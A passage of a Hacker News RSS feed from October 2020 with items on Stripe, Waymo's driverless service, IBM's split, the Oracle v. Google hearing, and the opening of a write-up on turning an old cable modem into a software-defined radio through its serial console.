&lt;p&gt;I feel like no writeup about the last four years can avoid 2020, which: it has been the toughest year of my life. I have struggled with low-grade depression for most of my life; events this year (&lt;em&gt;*gestures*&lt;/em&gt;) exacerbated that into a severe depressive episode. Props to very supportive colleagues (and a company policy which was extremely generous to employees needing extra help in 2020) for assisting me in working through this.&lt;/p&gt;
&lt;p&gt;I’ll probably write more about this sometime, but since the short version may be useful: Strongly consider talking to a medical professional; treatments exist and may help you. I’ve had a revolutionary improvement in QOL as a result of medication and daily exercise. There is still a struggle, but it’s my normal struggle and not causing nearly the degree of impact to my life that it was earlier this year.&lt;/p&gt;
&lt;h2 id=&quot;strongly-consider-working-at-stripe&quot;&gt;Strongly consider working at Stripe&lt;/h2&gt;
&lt;p&gt;I’m broadly happy at Stripe and presently intend to be here for at least a few more years. I think the company is likely going to change about as much in the next four years as the last four, again in a compounding fashion. It is entirely possible that products the world hasn’t seen yet will be bigger than Stripe itself was in 2016, 2018, or 2020.&lt;/p&gt;
&lt;p&gt;Want to work on them, or other worthy challenges, as our company starts to exit the awkward teenage years? We’re &lt;a href=&quot;https://stripe.com/jobs&quot;&gt;hiring&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;There is still more to build. There are still more entrepreneurs to help. There are still challenges to be solved and fun to be had.&lt;/p&gt;
&lt;hr/&gt;
</description>
<pubDate>Thu, 08 Oct 2020 16:58:48 +0000</pubDate>
<dc:creator>yarapavan</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://kalzumeus.com/2020/10/09/four-years-at-stripe/</dc:identifier>
</item>
<item>
<title>Waymo is opening its driverless service to more people in Phoenix</title>
<link>https://blog.waymo.com/2020/10/waymo-is-opening-its-fully-driverless.html</link>
<guid isPermaLink="true" >https://blog.waymo.com/2020/10/waymo-is-opening-its-fully-driverless.html</guid>
<description>&lt;div class=&quot;separator&quot;&gt;&lt;a href=&quot;https://1.bp.blogspot.com/-lhvTVv19848/X35GFzBAvJI/AAAAAAAAFMM/7dUz-sE2woAR__Lgy1p9bFOQLylc5oiMwCNcBGAsYHQ/s1920/ro.jpg&quot; imageanchor=&quot;1&quot;&gt;&lt;img alt=&quot;Thumbnail&quot; border=&quot;0&quot; data-original-height=&quot;1080&quot; data-original-width=&quot;1920&quot; src=&quot;https://1.bp.blogspot.com/-lhvTVv19848/X35GFzBAvJI/AAAAAAAAFMM/7dUz-sE2woAR__Lgy1p9bFOQLylc5oiMwCNcBGAsYHQ/s16000/ro.jpg&quot; title=&quot;Author: John Krafcik, CEO&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div readability=&quot;21.965&quot;&gt;Five years ago this month, Steve Mahan, the retired director of the Santa Clara Valley Blind Center, who lost his sight years before, took the &lt;a href=&quot;https://www.youtube.com/watch?v=uHbMt6WDhQ8&amp;amp;t=30s&quot;&gt;world's first ride&lt;/a&gt; in a self-driving car on public roads. This little car, called Firefly, had a top speed of just 25 mph, and used a combination of lidar, radar, cameras, and massive on-board computing power to navigate the busy streets of Austin, Texas. &lt;/div&gt;

&lt;p&gt;Since that first ride, which some have called a Kitty Hawk moment of sorts for fully autonomous technology, Waymo has been hard at work to bring the Waymo Driver to more and more people. In 2017, we began our early rider program in the Metro Phoenix area with the next generation of our technology, using the full-size hybrid Chrysler Pacifica. This 4th-generation Waymo Driver was significantly more sophisticated than Firefly’s technology, and for the last year, has pioneered fully driverless, paid rides on high-speed roads across a service area larger than the city of San Francisco. &lt;/p&gt;
&lt;br/&gt;Over time, as we improved the capability of our Waymo Driver, we increased the scope and quantity of our operations, with 5-10% of our rides in 2020 being fully driverless for our exclusive group of early riders under NDA. We’ve been gathering key learnings from these riders on how to optimize our driverless service experience and continuously improve it (in their words, it's a magical experience). We also began to offer more people access to our public Waymo One service, with a vehicle operator monitoring the ride.&lt;p&gt;Beginning today, October 8, we’re excited to open up our fully driverless offering to Waymo One riders. Members of the public service can now take friends and family along on their rides and share their experience with the world. We’ll start with those who are already a part of Waymo One and, over the next several weeks, welcome more people directly into the service through our app (available on &lt;a href=&quot;https://play.google.com/store/apps/details?id=com.waymo.carapp&amp;amp;utm_source=website-application&quot;&gt;Google Play&lt;/a&gt; and the &lt;a href=&quot;https://apps.apple.com/us/app/waymo/id1343524838&quot;&gt;App Store&lt;/a&gt;). In the near term, 100% of our rides will be fully driverless. We expect our new fully driverless service to be very popular, and we’re thankful to our riders for their patience as we ramp up availability to serve demand. Later this year, after we've finished adding in-vehicle barriers between the front row and the rear passenger cabin for in-vehicle hygiene and safety, we'll also be re-introducing rides with a trained vehicle operator, which will add capacity and allow us to serve a larger geographical area.&lt;/p&gt;&lt;p&gt;We’ve achieved this milestone with the thought and care that our riders expect from us. We’ve enhanced our health and safety policies and procedures throughout our fully-owned fleet, sought the feedback of our team, partners, riders, as well as federal, local, and state authorities, all while continuing to advance the Waymo Driver’s capabilities.&lt;/p&gt;&lt;p&gt;To our entire community: thank you for being a part of this important journey. And to all the Waymonauts who’ve worked so hard getting us here: thanks for your dedication to our mission. Together, we’re building a safe and more accessible future with every autonomous mile we drive.&lt;/p&gt;&lt;p&gt;&lt;em&gt;Check out more on how we’re safely resuming our rider services at &lt;a href=&quot;https://waymo.com/coronavirus&quot;&gt;waymo.com/coronavirus&lt;/a&gt;.&lt;/em&gt;
&lt;/p&gt;
&lt;div&gt;
&lt;div class=&quot;separator&quot;&gt;&lt;a href=&quot;https://1.bp.blogspot.com/-duCbXB2_Q8Y/X35E0dr-gvI/AAAAAAAAFMA/6tlgpcsiOf0PtXWxSwqnESLQyBw2_FS9ACNcBGAsYHQ/s480/Blog%2BPost%2BDriver%2B-%2BALT.gif&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;270&quot; data-original-width=&quot;480&quot; src=&quot;https://1.bp.blogspot.com/-duCbXB2_Q8Y/X35E0dr-gvI/AAAAAAAAFMA/6tlgpcsiOf0PtXWxSwqnESLQyBw2_FS9ACNcBGAsYHQ/s16000/Blog%2BPost%2BDriver%2B-%2BALT.gif&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;br/&gt;&lt;em&gt;&lt;br/&gt;&lt;/em&gt;&lt;/div&gt;
</description>
<pubDate>Thu, 08 Oct 2020 16:22:12 +0000</pubDate>
<dc:creator>klintcho</dc:creator>
<og:title>Waypoint - The official Waymo blog: Waymo is opening its fully driverless service to the general public in Phoenix</og:title>
<og:image>https://1.bp.blogspot.com/-lhvTVv19848/X35GFzBAvJI/AAAAAAAAFMM/7dUz-sE2woAR__Lgy1p9bFOQLylc5oiMwCNcBGAsYHQ/s72-c/ro.jpg</og:image>
<og:type>article</og:type>
<og:url>https://blog.waymo.com/2020/10/waymo-is-opening-its-fully-driverless.html</og:url>
<dc:format>text/html</dc:format>
<dc:identifier>https://blog.waymo.com/2020/10/waymo-is-opening-its-fully-driverless.html</dc:identifier>
</item>
<item>
<title>IBM is splitting itself into two public companies</title>
<link>https://www.reuters.com/article/us-ibm-divestiture/ibm-to-break-up-109-year-old-company-to-focus-on-cloud-growth-idUSKBN26T1TZ</link>
<guid isPermaLink="true" >https://www.reuters.com/article/us-ibm-divestiture/ibm-to-break-up-109-year-old-company-to-focus-on-cloud-growth-idUSKBN26T1TZ</guid>
<description>&lt;div class=&quot;ArticleBody-byline-container-3H6dy&quot;&gt;
&lt;p class=&quot;Byline-byline-1sVmo ArticleBody-byline-10B7D&quot;&gt;By &lt;a class=&quot;TextLabel__text-label___3oCVw TextLabel__black-to-orange___23uc0 TextLabel__serif___3lOpX Byline-author-2BSir&quot; href=&quot;https://www.reuters.com/journalists/munsif-vengattil&quot; target=&quot;_blank&quot;&gt;Munsif Vengattil&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;ArticleBody-read-time-and-social-2VOIr&quot;&gt;
&lt;p class=&quot;TextLabel__text-label___3oCVw TextLabel__gray___1V4fk TextLabel__small-all-caps-spaced-out___3O9H4 ReadTime-read-time-1s3CG ArticleBody-read-time-29pGN&quot;&gt;3 Min Read&lt;/p&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;p class=&quot;Paragraph-paragraph-2Bgue ArticleBody-para-TD_9x&quot;&gt;&lt;span&gt;(Reuters) - International Business Machines Corp&lt;/span&gt; &lt;span&gt;&lt;a href=&quot;https://www.reuters.com/companies/IBM.N&quot;&gt;IBM.N&lt;/a&gt;&lt;/span&gt; &lt;span&gt;is splitting itself into two public companies, capping a years-long effort by the world's first big computing firm to diversify away from its legacy businesses to focus on high-margin cloud computing.&lt;/span&gt;&lt;/p&gt;

&lt;p class=&quot;Paragraph-paragraph-2Bgue ArticleBody-para-TD_9x&quot;&gt;IBM will list its IT infrastructure services unit, which provides technical support for 4,600 clients in 115 countries and has a backlog of $60 billion, as a separate company with a new name by the end of 2021.&lt;/p&gt;
&lt;p class=&quot;Paragraph-paragraph-2Bgue ArticleBody-para-TD_9x&quot;&gt;The new company will have 90,000 employees and its leadership structure will be decided in a few months, Chief Financial Officer James Kavanaugh told Reuters.&lt;/p&gt;
&lt;p class=&quot;Paragraph-paragraph-2Bgue ArticleBody-para-TD_9x&quot;&gt;IBM, which currently has more than 352,000 workers, said it expects to record nearly $5 billion in expenses related to the separation and operational changes.&lt;/p&gt;

&lt;p class=&quot;Paragraph-paragraph-2Bgue ArticleBody-para-TD_9x&quot;&gt;Investors cheered the surprise move by Chief Executive Officer Arvind Krishna, the key architect behind IBM’s $34 billion acquisition of cloud company Red Hat last year, sending the company’s shares up 7%.&lt;/p&gt;
&lt;p class=&quot;Paragraph-paragraph-2Bgue ArticleBody-para-TD_9x&quot;&gt;“We divested networking back in the ‘90s, we divested PCs back in the 2000s, we divested semiconductors about five years ago because all of them didn’t necessarily play into the integrated value proposition,” Krishna said on a call with analysts.&lt;/p&gt;

&lt;h2 class=&quot;Headline-headline-2FXIq Headline-black-OogpV ArticleBody-heading-3h695&quot;&gt;BIG BLUE’S NEW FOCUS&lt;/h2&gt;
&lt;p class=&quot;Paragraph-paragraph-2Bgue ArticleBody-para-TD_9x&quot;&gt;In a blog, Krishna called the move a “significant shift” in the 109-year-old company’s business model.&lt;/p&gt;
&lt;p class=&quot;Paragraph-paragraph-2Bgue ArticleBody-para-TD_9x&quot;&gt;“IBM is essentially getting rid of a shrinking, low-margin operation given the cannibalizing impact of automation and cloud, masking stronger growth for the rest of the operation,” Wedbush Securities analyst Moshe Katri said.&lt;/p&gt;
&lt;p class=&quot;Paragraph-paragraph-2Bgue ArticleBody-para-TD_9x&quot;&gt;IBM, which has sought to make up for slowing software sales and seasonal demand for its mainframe servers, said it would now focus on open hybrid cloud and AI solutions that will account for more than half of its recurring revenues.&lt;/p&gt;

&lt;p class=&quot;Paragraph-paragraph-2Bgue ArticleBody-para-TD_9x&quot;&gt;Krishna, who replaced Ginni Rometty as CEO in April, said IBM’s software and solutions portfolio would account for the majority of company revenue after the separation.&lt;/p&gt;
&lt;p class=&quot;Paragraph-paragraph-2Bgue ArticleBody-para-TD_9x&quot;&gt;The company also said it expects third-quarter revenue of $17.6 billion and an adjusted profit per share of $2.58, roughly in line with Street estimates.&lt;/p&gt;
&lt;div readability=&quot;4.8943089430894&quot;&gt;
&lt;div class=&quot;Attribution-attribution-Y5JpY&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;Reporting by Munsif Vengattil in Bengaluru; Editing by Ramakrishnan M.&lt;/p&gt;
&lt;/div&gt;

&lt;/div&gt;
</description>
<pubDate>Thu, 08 Oct 2020 16:16:36 +0000</pubDate>
<dc:creator>dredmorbius</dc:creator>
<og:title>IBM to break up 109-year old company to focus on cloud growth</og:title>
<og:description>International Business Machines Corp &lt;IBM.N&gt; is splitting itself into two public companies, capping a years-long effort by the world's first big computing firm to diversify away from its legacy businesses to focus on high-margin cloud computing.</og:description>
<og:image>https://static.reuters.com/resources/r/?m=02&amp;d=20201008&amp;t=2&amp;i=1536712604&amp;r=LYNXMPEG9713W&amp;w=800</og:image>
<og:url>https://www.reuters.com/article/us-ibm-divestiture-idUSKBN26T1TZ</og:url>
<og:type>article</og:type>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.reuters.com/article/us-ibm-divestiture/ibm-to-break-up-109-year-old-company-to-focus-on-cloud-growth-idUSKBN26T1TZ</dc:identifier>
</item>
<item>
<title>AMD Zen 3/Ryzen 5000 announcement [video]</title>
<link>https://www.youtube.com/embed/iuiO6rqYV4o</link>
<guid isPermaLink="true" >https://www.youtube.com/embed/iuiO6rqYV4o</guid>
<description>[unable to retrieve full-text content]
&lt;p&gt;Article URL: &lt;a href=&quot;https://www.youtube.com/embed/iuiO6rqYV4o&quot;&gt;https://www.youtube.com/embed/iuiO6rqYV4o&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Comments URL: &lt;a href=&quot;https://news.ycombinator.com/item?id=24720353&quot;&gt;https://news.ycombinator.com/item?id=24720353&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Points: 537&lt;/p&gt;
&lt;p&gt;# Comments: 460&lt;/p&gt;
</description>
<pubDate>Thu, 08 Oct 2020 15:57:58 +0000</pubDate>
<dc:creator>thg</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.youtube.com/embed/iuiO6rqYV4o</dc:identifier>
</item>
<item>
<title>Google’s Supreme Court faceoff with Oracle was a disaster for Google</title>
<link>https://arstechnica.com/tech-policy/2020/10/googles-supreme-court-faceoff-with-oracle-was-a-disaster-for-google/</link>
<guid isPermaLink="true" >https://arstechnica.com/tech-policy/2020/10/googles-supreme-court-faceoff-with-oracle-was-a-disaster-for-google/</guid>
<description>&lt;img src=&quot;https://cdn.arstechnica.net/wp-content/uploads/2020/10/GettyImages-1167615441-800x533.jpg&quot; alt=&quot;&amp;quot;Everybody knows that APIs, declaring codes, are not copyrightable,&amp;quot; Justice Sonia Sotomayor said during Wednesday's oral arguments. But most of her colleagues didn't seem convinced.&quot;/&gt;&lt;div class=&quot;caption-text&quot;&gt;&lt;a href=&quot;https://cdn.arstechnica.net/wp-content/uploads/2020/10/GettyImages-1167615441.jpg&quot; class=&quot;enlarge-link&quot; data-height=&quot;3712&quot; data-width=&quot;5568&quot;&gt;Enlarge&lt;/a&gt; &lt;span class=&quot;sep&quot;&gt;/&lt;/span&gt; &quot;Everybody knows that APIs, declaring codes, are not copyrightable,&quot; Justice Sonia Sotomayor said during Wednesday's oral arguments. But most of her colleagues didn't seem convinced.&lt;/div&gt;&lt;div class=&quot;caption-credit&quot;&gt;Paul Marotta/Getty Images&lt;/div&gt;
&lt;aside id=&quot;social-left&quot; class=&quot;social-left&quot; aria-label=&quot;Read the comments or share this article&quot;&gt;
&lt;h4 class=&quot;comment-count-before&quot;&gt;&lt;a title=&quot;174 posters participating, including story author&quot; class=&quot;comment-count icon-comment-bubble-down&quot; href=&quot;https://arstechnica.com/tech-policy/2020/10/googles-supreme-court-faceoff-with-oracle-was-a-disaster-for-google/?comments=1&quot;&gt;reader comments&lt;/a&gt;&lt;/h4&gt;
&lt;a title=&quot;174 posters participating, including story author&quot; class=&quot;comment-count icon-comment-bubble-down&quot; href=&quot;https://arstechnica.com/tech-policy/2020/10/googles-supreme-court-faceoff-with-oracle-was-a-disaster-for-google/?comments=1&quot;&gt;&lt;span class=&quot;comment-count-number&quot;&gt;333&lt;/span&gt; &lt;span class=&quot;visually-hidden&quot;&gt;with 174 posters participating, including story author&lt;/span&gt;&lt;/a&gt;
&lt;div class=&quot;share-links&quot;&gt;
&lt;h4&gt;Share this story&lt;/h4&gt;
&lt;/div&gt;
&lt;/aside&gt;&lt;aside class=&quot;related-stories right&quot;&gt;&lt;h2 class=&quot;subheading notched&quot;&gt;Oracle v. Google&lt;/h2&gt;
&lt;span class=&quot;read-more&quot;&gt;&lt;a class=&quot;recommendation-series&quot; href=&quot;https://arstechnica.com/series/series-oracle-v-google/&quot;&gt;View more stories&lt;/a&gt;&lt;/span&gt;&lt;/aside&gt;&lt;p&gt;The Supreme Court's eight justices on Wednesday seemed skeptical of Google's argument that application programming interfaces (APIs) are not protected by copyright law. The high court was hearing oral arguments in Google's &lt;a href=&quot;https://arstechnica.com/tech-policy/2012/04/oracles-ip-war-against-google-finally-going-to-trial-whats-at-stake/&quot;&gt;decade-long legal battle&lt;/a&gt; with Oracle. Oracle argues that Google infringed its copyright in the Java programming language when it re-implemented Java APIs for use by Android app developers.&lt;/p&gt;
&lt;p&gt;The stakes in the case are high for Google, which could owe Oracle billions of dollars in damages. More importantly, an Oracle win could reshape how copyright law treats APIs, giving incumbents the power to lock out competitors who want to build compatible software.&lt;/p&gt;
&lt;p&gt;For decades prior to Oracle's lawsuit, most people in the software industry assumed that APIs couldn't be copyrighted. That meant a software company could re-implement the APIs of a competitor's product in order to enable software, designed to work with the competitor's product, to work with its own.&lt;/p&gt;
&lt;p&gt;A win for Oracle would call that into question. That would not only generate extra work for copyright lawyers, it could lead to a world where software compatibility problems crop up more often in everyday life. It could also directly affect the livelihoods of computer programmers, who might find they are more frequently forced to learn new programming languages or other software tools when they switch jobs.&lt;/p&gt;
&lt;p&gt;It's always risky to extrapolate from Supreme Court oral arguments. Sometimes justices ask one party tougher questions but rule for that side anyway. Still, after listening to Wednesday's arguments, I had trouble imagining a five-justice majority accepting Google's argument that API's cannot be copyrighted. If Google wins, it seems likely to be on narrower grounds—grounds that would open the door to more API copyright lawsuits in the future. Frankly, there seems to be a good chance that Oracle will prevail.&lt;/p&gt;
&lt;h2&gt;Google's lawyer “did an abysmal job”&lt;/h2&gt;
&lt;a href=&quot;https://cdn.arstechnica.net/wp-content/uploads/2020/10/GettyImages-1134321120.jpg&quot; class=&quot;enlarge&quot; data-height=&quot;4165&quot; data-width=&quot;6248&quot; alt=&quot;Justice Samuel Alito worried that a ruling against API copyrights could undermine copyright protection for all computer programs.&quot;&gt;&lt;img src=&quot;https://cdn.arstechnica.net/wp-content/uploads/2020/10/GettyImages-1134321120-640x427.jpg&quot; width=&quot;640&quot; height=&quot;427&quot; srcset=&quot;https://cdn.arstechnica.net/wp-content/uploads/2020/10/GettyImages-1134321120-1280x853.jpg 2x&quot; alt=&quot;Justice Samuel Alito worried that a ruling against API copyrights could undermine copyright protection for all computer programs.&quot;/&gt;&lt;/a&gt;
&lt;div class=&quot;caption-text&quot;&gt;&lt;a href=&quot;https://cdn.arstechnica.net/wp-content/uploads/2020/10/GettyImages-1134321120.jpg&quot; class=&quot;enlarge-link&quot; data-height=&quot;4165&quot; data-width=&quot;6248&quot;&gt;Enlarge&lt;/a&gt; &lt;span class=&quot;sep&quot;&gt;/&lt;/span&gt; Justice Samuel Alito worried that a ruling against API copyrights could undermine copyright protection for all computer programs.&lt;/div&gt;
&lt;div class=&quot;caption-credit&quot;&gt;Chip Somodevilla/Getty Images&lt;/div&gt;
&lt;p&gt;In the mid-2000s, Google knew that it would need a lot of developers to build apps for its forthcoming Android platform. To speed up the process, Google re-implemented the Java programming language rather than developing a new programming language from scratch. Google wrote new code to execute Java programs according to the exact specifications of Sun's official Java software (Oracle subsequently acquired Sun). This allowed thousands of existing Java programmers to become Android developers without having to learn a new language.&lt;/p&gt;
&lt;p&gt;To re-implement Java, Google needed to copy the names and argument types of functions like &lt;a href=&quot;https://docs.oracle.com/javase/8/docs/api/java/lang/Math.html&quot;&gt;java.lang.Math.max.&lt;/a&gt; Otherwise a Java program that used these functions wouldn't work on Google's operating system. &lt;a href=&quot;https://www.law.cornell.edu/uscode/text/17/102&quot;&gt;Section 102(b) of the Copyright Act&lt;/a&gt; says that no one can copyright an &quot;idea, procedure, process, system, method of operation, concept, principle, or discovery.&quot; Google concluded that functions like Math.max are &quot;methods of operation&quot; because programmers &quot;operate&quot; the Java platform by invoking them. Hence, Google didn't purchase a license from Sun, leading to a lawsuit a few years later.&lt;/p&gt;
&lt;p&gt;This is a widespread practice in the software industry. Oracle, for example, &lt;a href=&quot;https://arstechnica.com/tech-policy/2020/01/oracle-copied-amazons-api-was-that-copyright-infringement/&quot;&gt;re-implemented Amazon's S3 API&lt;/a&gt; so that customers who built software for Amazon's cloud platform could easily switch to Oracle's rival cloud platform.&lt;/p&gt;

&lt;p&gt;Oracle's strategy throughout the 10-year legal battle has been to essentially deny that there is anything special about APIs. In Oracle's view, an API specification—essentially just a list of function names and argument types—is computer code that can be copyrighted just as any other code can. Oracle claims that if the courts strip API specifications of copyright protection, lawyers could use the same arguments to weaken copyright protections for any computer program.&lt;/p&gt;
&lt;p&gt;Justice Samuel Alito raised this concern in his first question to Google's lawyer, Thomas Goldstein.&lt;/p&gt;
&lt;p&gt;&quot;I'm concerned that under your argument, all computer code is at risk of losing protection under 102(b),&quot; Alito said. &quot;How do you square your position with Congress' express intent to provide protection for computer codes?&quot;&lt;/p&gt;
&lt;p&gt;Arguably Goldstein's most important task here—and throughout Wednesday's argument—was to convince justices that there was an important difference between APIs and other code and that this difference had legal implications.&lt;/p&gt;
&lt;p&gt;&quot;He did an abysmal job,&quot; Cornell University legal scholar James Grimmelmann told Ars in a Wednesday phone interview. &quot;At the level of nuance he was willing to get into, his case was a loser. The only way to make it stick is to be nuanced about what it means to declare code.&quot;&lt;/p&gt;

</description>
<pubDate>Thu, 08 Oct 2020 15:17:42 +0000</pubDate>
<dc:creator>randtrain34</dc:creator>
<og:url>https://arstechnica.com/tech-policy/2020/10/googles-supreme-court-faceoff-with-oracle-was-a-disaster-for-google/</og:url>
<og:title>Google’s Supreme Court faceoff with Oracle was a disaster for Google</og:title>
<og:image>https://cdn.arstechnica.net/wp-content/uploads/2020/10/GettyImages-1167615441-760x380.jpg</og:image>
<og:description>Supreme Court justices seem poised to allow copyrights on APIs.</og:description>
<og:type>article</og:type>
<dc:language>en-us</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://arstechnica.com/tech-policy/2020/10/googles-supreme-court-faceoff-with-oracle-was-a-disaster-for-google/</dc:identifier>
</item>
<item>
<title>Show HN: I reverse engineered my cable modem and turned it into an SDR</title>
<link>https://stdw.github.io/cm-sdr/</link>
<guid isPermaLink="true" >https://stdw.github.io/cm-sdr/</guid>
<description>&lt;div id=&quot;title&quot;&gt;

&lt;hr/&gt;&lt;span class=&quot;credits left&quot;&gt;Project maintained by &lt;a href=&quot;https://github.com/stdw&quot;&gt;stdw&lt;/a&gt;&lt;/span&gt; &lt;span class=&quot;credits right&quot;&gt;Hosted on GitHub Pages — Theme by &lt;a href=&quot;https://twitter.com/michigangraham&quot;&gt;mattgraham&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&quot;https://stdw.github.io/cm-sdr/img/modem.jpg&quot; alt=&quot;cable modem&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;A few weeks ago I got curious about an old cable modem sitting in my closet, a Motorola MB7220. Initially I was interested in what kind of hardware it had and if it was running Linux. Some quick searching brought me to a thread on a web forum where people were discussing the built in spectrum analyzer feature used for diagnostics. Someone mentioned that they could see spikes corresponding to FM radio stations. This sparked a thought: if a cable modem and a digital TV tuner dongle are fundamentally doing the same thing (receiving and demodulating QAM signals), could a modem be turned into an &lt;a href=&quot;https://en.wikipedia.org/wiki/Software-defined_radio&quot;&gt;SDR (software-defined radio)&lt;/a&gt; a la &lt;a href=&quot;https://www.rtl-sdr.com/&quot;&gt;RTL-SDR&lt;/a&gt;?&lt;/p&gt;
&lt;p&gt;Going into this project, I knew next to nothing about RF and had no idea if this goal was even feasible at all for the hardware. I found &lt;a href=&quot;http://www.hermeslite.com&quot;&gt;an SDR project&lt;/a&gt; based on an Analog Devices cable modem chip, as well as a &lt;a href=&quot;https://forums.qrz.com/index.php?threads/cable-modem-to-software-defined-radio-modification-projects.512433/&quot;&gt;forum thread&lt;/a&gt; where someone else was wondering about the same thing a few years ago.&lt;/p&gt;
&lt;p&gt;The last post in the thread from user VK4HAT states:&lt;/p&gt;
&lt;blockquote readability=&quot;12&quot;&gt;
&lt;p&gt;I say if you have the skills, time and desire, give it a go and see where you end up. If google shows nothing, then its likely not been tried. With so few firsts available in life, take those that present themselves and have a crack, even if failure is always an option.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So that is exactly what I did.&lt;/p&gt;
&lt;h2 id=&quot;gaining-access&quot;&gt;Gaining Access&lt;/h2&gt;
&lt;p&gt;My first goal was to look for an access vector or a way to communicate with the device. I knew that there wasn’t much to see on the web interface and telnet was disabled, so I skipped ahead to opening it up.&lt;/p&gt;
&lt;p&gt;After removing a few screws from the plastic housing to get access to the board, my first thought was to look for &lt;a href=&quot;https://en.wikipedia.org/wiki/Universal_asynchronous_receiver-transmitter&quot;&gt;UART&lt;/a&gt; headers to take a peek at the serial console. After identifying two candidates consisting of four vias surrounded by a rectangle near the edge of the PCB, it was time to identify the pins. Using a multimeter, the ground pin can be easily identified by checking the continuity with one of the metal shields on board. The VCC pin can be identified by measuring the voltage of each pin when powering on the board. It should be a steady 3.3v, or in some cases 1.8v or 5v. This pin is not needed, but is still useful to identify the operating voltage and eliminate one candidate for the Tx and Rx pins. While booting, the Tx pin will sit on average a little lower than the VCC pin and drop much lower when a lot of data is being output. This leaves the last pin as Rx.&lt;/p&gt;
&lt;p&gt;One of the UARTs identified earlier did not seem to be transmitting anything while the other did. After soldering some wires to the active UART, I connected the Tx to UART Rx GPIO pin on a Raspberry Pi, the Rx to the Pi’s Tx, and the ground to the ground pin. Note that this can only be done because both systems are 3.3v. Had that not been the case, a USB TTL adapter with an adjustable voltage level could be used just as easily, and is probably a better idea most of the time anyway.&lt;/p&gt;
&lt;p&gt;There are a few reasons why the Raspberry Pi is not the best serial interface such as if you need parity or other features, but in this case I had it on hand and it works. The serial console of the Pi must also be disabled so that it can be freed up for other purposes. There is another reason I chose to use the Raspberry Pi which I will get to later.&lt;/p&gt;
&lt;p&gt;Finally, to actually see the data I used the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cu&lt;/code&gt; utility:&lt;br/&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cu -l /dev/serial0 -s 115200&lt;/code&gt;&lt;br/&gt;The baud rate was a lucky guess, but 115200 is very common on such devices. If the baud rate is wrong you will quickly know when you see a bunch of garbage on the screen. A logic analyzer could be used to definitively find the baud rate and other parameters, but guessing is sometimes quicker and always cheaper.&lt;/p&gt;
&lt;p&gt;After powering on the device, the terminal filled with output:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;36&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;17&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;pi@raspberrypi:~/modem $ cu -l /dev/serial0 -s 115200
Connected.
�
B3312inim S C 84(9 m
ose_VS 8
STesldlo rh 83 rs 10
STesldhi: _h 8, _s 13
Sync: 0 
MemSize:            128 M
Chip ID:     BCM3383D-B0

BootLoader Version: 2.4.0 fyl spiboot reduced DDR drive avs
Build Date: Nov 12 2015
Build Time: 14:31:43
SPI flash ID 0xef4016, size 4MB, block size 64KB, write buffer 256, flags 0x0
Cust key size 128

Signature/PID: 3383


Image 1 Program Header:
   Signature: 3383
     Control: 0005
   Major Rev: 0003
   Minor Rev: 0000
  Build Time: 2015/11/26 08:47:57 Z
 File Length: 1692841 bytes
Load Address: 80004000
    Filename: ecram_sto.bin
         HCS: e749
         CRC: 175b753f

Found image 1 at offset 20000

Enter '1', '2', or 'p' within 2 seconds or take default...


Performing CRC on Image 1...
CRC time = 282177012
Detected LZMA compressed image... decompressing... 
Target Address: 0x80004000
decompressSpace is 0x8000000
Elapsed time 736066500

Decompressed length: 8091524

Executing Image 1...


 eCos - hal_diag_init
Ecos memory map:
BLOCK    OWNER        MIPS      SIZE      MEM
Block 0: Owner: 0 - 0x00000000 0x07e00000 0x00000000
Block 0: Owner: 0 - 0 MB 126 MB 0 MB
Block 1: Owner: 3 - 0x07e00000 0x00200000 0x07e00000
Block 1: Owner: 3 - 126 MB 2 MB 126 MB
126MB (129024KB) remaining for eCos
Init device '/dev/BrcmTelnetIoDriver'
Init device '/dev/ttydiag'
Init tty channel: 807bb020
Init device '/dev/tty0'
Init tty channel: 807bb040
Init device '/dev/haldiag'
HAL/diag SERIAL init
Init device '/dev/ser0'
BCM 33XX SERIAL init - dev: b4e00500.2
Set output buffer - buf: 0x80852408 len: 4096
Set input buffer - buf: 0x80853408 len: 4096
BCM 33XX SERIAL config
Init device '/dev/ser1'
BCM 33XX SERIAL init - dev: b4e00520.3
Set output buffer - buf: 0x80854408 len: 4096
Set input buffer - buf: 0x80855408 len: 4096
BCM 33XX SERIAL config

Init device '/dev/ser2'
InitBoard: MIPS frequency 637200000

...

Reading Permanent settings from non-vol...
Checksum for permanent settings:  0xe9d88f65
Setting downstream calibration signature to '5.7.1mp1|die temperature:70.775degC'
Settings were read and verified.


Reading Dynamic settings from non-vol...
Checksum for dynamic settings:  0x6e4a329
Settings were read and verified.

Console input has been disabled in non-vol.
Console output has been disabled in non-vol!  Goodbye...
[00:00:00 01/01/1970] [Reset/Standby Switch Thread] BcmResetStandbySwitchThread::ProcessResetSwitchEvent:  (Reset/Standby Switch Thread) Reset switch released; resetting...
[00:00:00 01/01/1970] [Reset/Standby Switch Thread] BcmResetStandbySwitchThread::ProcessResetSwitchEvent:  (Reset/Standby Switch Thread) Cant Reset pfCmDocsisCtlThread==NULL...
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
